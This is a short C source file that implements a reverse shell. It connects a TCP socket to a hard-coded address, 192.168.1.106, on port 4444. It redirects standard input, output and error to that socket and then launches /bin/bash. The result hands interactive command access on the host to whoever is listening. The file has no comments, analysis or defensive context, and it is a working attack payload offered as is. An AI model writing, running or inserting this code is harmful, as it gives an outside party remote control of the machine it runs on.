#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 4444
#define SERVER 192.168.1.2

int main(void){

        int sockt;
        int port = PORT;
        struct sockaddr_in revsockaddr;

        sockt = socket(AF_INET, SOCK_STREAM,0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.106");

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL);

        return 0;

}
